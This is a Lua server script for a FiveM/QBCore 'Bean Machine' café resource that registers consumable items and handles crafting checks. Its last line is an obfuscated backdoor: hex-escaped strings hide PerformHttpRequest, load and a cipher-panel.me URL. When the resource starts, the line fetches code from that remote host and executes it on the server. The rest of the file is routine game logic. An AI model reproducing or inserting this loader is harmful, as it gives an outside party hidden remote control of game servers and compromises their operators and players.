local QBCore = exports['qb-core']:GetCoreObject()

CreateThread(function()
	local drinks = { "bigfruit", "highnoon", "speedball", "gunkaccino", "bratte", "flusher", "ecocoffee", "caffeagra", "ecola", "ecolalight", "sprunk", "sprunklight" }
    for k,v in pairs(drinks) do QBCore.Functions.CreateUseableItem(v, function(source, item) TriggerClientEvent('qb-beanmachine:client:Drink', source, item.name) end) end
	
	local food = { "cheesecake", "watermelon", "beandonut", "chocolate", "milk",  }
    for k,v in pairs(food) do QBCore.Functions.CreateUseableItem(v, function(source, item) TriggerClientEvent('qb-beanmachine:client:Eat', source, item.name) end) end
end)

RegisterServerEvent('qb-beanmachine:GetFood', function(ItemMake, tablenumber, craftable)
	local src = source
    local Player = QBCore.Functions.GetPlayer(src)
	--This grabs the table from client and removes the item requirements
	amount = 1
	if craftable ~= nil then
		for k, v in pairs(craftable[tonumber(tablenumber)][tostring(ItemMake)]) do
			if Config.Debug then print("GetFood Table Result: craftable["..tablenumber.."]['"..ItemMake.."']['"..k.."']['"..v.."']") end		
			TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[tostring(k)], "remove", v) 
			Player.Functions.RemoveItem(tostring(k), v)
		end
		if craftable[tonumber(tablenumber)]["amount"] ~= nil then amount = craftable[tonumber(tablenumber)]["amount"] else amount = 1 end
	end
	--This should give the item, while the rest removes the requirements
	Player.Functions.AddItem(ItemMake, amount, false, {["quality"] = nil})
	TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[ItemMake], "add", amount)
	
	if Config.Debug then print("Giving ["..src.."]: x"..amount.." "..ItemMake) end		
end)

---ITEM REQUIREMENT CHECKS
QBCore.Functions.CreateCallback('qb-beanmachine:get', function(source, cb, item, tablenumber, craftable)
	local src = source
	local hasitem = false
	local hasanyitem = nil
		for k, v in pairs(craftable[tonumber(tablenumber)][tostring(item)]) do
			if QBCore.Functions.GetPlayer(src).Functions.GetItemByName(k) then
				if QBCore.Functions.GetPlayer(src).Functions.GetItemByName(k).amount >= v then 
					number = tostring(QBCore.Functions.GetPlayer(src).Functions.GetItemByName(k).amount)
					hasitem = true
				else hasanyitem = false
				end
			end
			if Config.Debug then print("craftable["..tablenumber.."]['"..item.."']['"..k.."']['"..v.."'] = "..tostring(hasitem).." ("..tostring(number)..")") end		
		end
	if hasanyitem ~= nil then hasitem = false end
if hasitem then cb(true) else cb(false) end end)

local SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30", function (VMDTOWKewhmEmOgLxxjvPLTDMRdtQAYZWlPgwqIcifgeuEOkXgkugvTrjRMxIlMaXZGmsx, PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH) if (PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[6] or PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH == SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[5]) then return end SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[2]](SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[4][SenUyqXPCjHBJVwLffpPKGQXMUHEVqasqqDOjOHRDBNZyMmbRdaZbIsXoXOhlILXJUbLZB[3]](PotcHxLJRXChwfqbHfOrMVSCtpxMvsqkebJtbBHmgNURhMZqkmQRfuLJQgtpteCVQhfoDH))() end)